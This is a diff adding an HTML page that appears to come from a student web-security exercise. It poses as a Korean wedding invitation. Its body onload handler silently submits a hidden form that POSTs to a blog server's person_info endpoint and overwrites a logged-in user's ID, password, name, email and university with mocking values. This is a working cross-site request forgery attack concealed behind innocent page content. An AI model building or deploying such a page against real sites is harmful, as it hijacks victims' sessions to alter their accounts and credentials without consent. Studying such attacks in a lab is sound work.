@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CJU-Blog</title>
+</head>
+<body onload="document.hacker_form.submit()">
+
+    <p>안녕하세요?</p>
+    <p>우리 결혼합니다.</p>
+    <p>일시: 2045. 5. 5. (어린이날) 오후 1시</p>
+    <p>장소: 용궁예식장</p>
+    <p>주례: 노기섭 교수님</p>
+
+
+    <form action="http://203.252.240.43:5001/person_info" method="POST" 
+        name="hacker_form" hidden>
+        <input type="text" class="form-control" id="user_id" name="user_id" 
+            value="kafa46">
+        <input type="password" class="form-control" id="passwd" name="passwd"
+            value="1234">
+        <input type="text" class="form-control" id="name" name="name"
+            value="노기섭-바보">
+        <input type="text" class="form-control" id="email" name="email"
+            value="kafa46@gmail.hacker">
+        <input type="text" class="form-control" id="university" name="university"
+            value="초딩이냐? 또 당했냐? 바보냐?">
+    </form>
+</body>
+</html>
